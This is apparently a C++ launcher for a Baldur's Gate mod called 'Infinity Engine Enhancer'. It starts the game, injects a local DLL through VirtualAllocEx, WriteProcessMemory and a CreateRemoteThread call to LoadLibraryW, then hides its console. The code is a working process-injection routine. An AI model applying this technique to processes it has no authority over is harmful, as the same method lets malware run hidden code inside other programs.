#include <windows.h>
#include <string>
#include <vector>
#include <cstdio>
#include <tlhelp32.h>
#include <filesystem>
#include <conio.h>

// --- Function to find the Process ID (PID) by its name ---
DWORD GetProcessIdByName(const wchar_t* processName) {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32FirstW(snapshot, &entry) == TRUE) {
        while (Process32NextW(snapshot, &entry) == TRUE) {
            if (wcscmp(entry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }

    CloseHandle(snapshot);
    return 0; // Return 0 if the process is not found
}

// --- Function to find game executable in current directory ---
std::wstring FindGameExecutable() {
    const std::vector<std::wstring> gameExes = {
        L"Baldur.exe",
        L"BaldursGate.exe",
        L"BGEE.exe",
        L"baldur.exe"
    };

    for (const auto& exe : gameExes) {
        if (std::filesystem::exists(exe)) {
            return exe;
        }
    }
    return L"";
}

// --- Function to get DLL path in current directory ---
std::wstring GetDllPath() {
    std::wstring dllName = L"InfinityEngine-Enhancer.dll";
    if (std::filesystem::exists(dllName)) {
        wchar_t currentDir[MAX_PATH];
        GetCurrentDirectoryW(MAX_PATH, currentDir);
        return std::wstring(currentDir) + L"\\" + dllName;
    }
    return L"";
}

// --- Main Injection Logic ---
int wmain(int argc, wchar_t** argv) {
    wprintf(L"Infinity Engine Enhancer - Game Launcher\n");
    wprintf(L"=========================================\n\n");

    // Find game executable
    std::wstring gameExeName = FindGameExecutable();
    if (gameExeName.empty()) {
        wprintf(L"ERROR: Could not find game executable in current directory.\n");
        wprintf(L"Expected files: Baldur.exe, BaldursGate.exe, BGEE.exe, or baldur.exe\n");
        wprintf(L"Press any key to exit...\n");
        _getwch();
        return 1;
    }

    // Get DLL path
    std::wstring dllPath = GetDllPath();
    if (dllPath.empty()) {
        wprintf(L"ERROR: Could not find InfinityEngine-Enhancer.dll in current directory.\n");
        wprintf(L"Press any key to exit...\n");
        _getwch();
        return 1;
    }

    wprintf(L"-> Found game: %ls\n", gameExeName.c_str());
    wprintf(L"-> Found DLL: %ls\n", dllPath.c_str());
    wprintf(L"-> Launching game...\n");

    // Launch the game process
    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);

    if (!CreateProcessW(gameExeName.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        wprintf(L"-> ERROR: Failed to launch %ls (Error code: %lu)\n", gameExeName.c_str(), GetLastError());
        wprintf(L"Press any key to exit...\n");
        _getwch();
        return 1;
    }

    wprintf(L"-> Game launched successfully (PID: %lu)\n", pi.dwProcessId);
    wprintf(L"-> Waiting a moment for game to initialize...\n");
    Sleep(2000); // Give the game time to start up

    DWORD processID = pi.dwProcessId;

    wprintf(L"-> Found process %ls (PID: %lu)\n", gameExeName.c_str(), processID);
    wprintf(L"-> Attempting to inject DLL: %ls\n", dllPath.c_str());

    // Get a handle to the game process with the necessary permissions
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) {
        wprintf(L"-> ERROR: Failed to open process. Try running as Administrator. (Error code: %lu)\n", GetLastError());
        return 1;
    }

    // Allocate memory inside the game process for our DLL path string
    SIZE_T bytes = (dllPath.size() + 1) * sizeof(wchar_t);
    LPVOID remoteStr = VirtualAllocEx(hProcess, nullptr, bytes, MEM_COMMIT, PAGE_READWRITE);

    if (remoteStr == NULL) {
        wprintf(L"-> ERROR: Failed to allocate memory in the target process. (Error code: %lu)\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // Write the DLL path into the allocated memory
    if (!WriteProcessMemory(hProcess, remoteStr, dllPath.c_str(), bytes, nullptr)) {
        wprintf(L"-> ERROR: Failed to write to process memory. (Error code: %lu)\n", GetLastError());
        VirtualFreeEx(hProcess, remoteStr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Get the address of the LoadLibraryW function from kernel32.dll
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (loadLibraryAddr == NULL) {
        wprintf(L"-> ERROR: Failed to get address of LoadLibraryW.\n");
        VirtualFreeEx(hProcess, remoteStr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread in the game process that calls LoadLibraryW with our DLL path as the argument
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteStr, 0, nullptr);

    if (hThread == NULL) {
        wprintf(L"-> ERROR: Failed to create remote thread. (Error code: %lu)\n", GetLastError());
        VirtualFreeEx(hProcess, remoteStr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    wprintf(L"-> Waiting for remote thread to finish...\n");
    WaitForSingleObject(hThread, INFINITE);

    wprintf(L"-> Injection successful!\n");
    wprintf(L"-> Game is now running with Infinity Engine Enhancer loaded.\n");
    wprintf(L"-> Hiding console and monitoring game process...\n");

    // Clean up injection resources
    VirtualFreeEx(hProcess, remoteStr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    // Hide the console window
    Sleep(1000); // Brief pause to see the success message
    HWND consoleWindow = GetConsoleWindow();
    if (consoleWindow) {
        ShowWindow(consoleWindow, SW_HIDE);
    }

    // Monitor the game process and wait for it to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up process handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}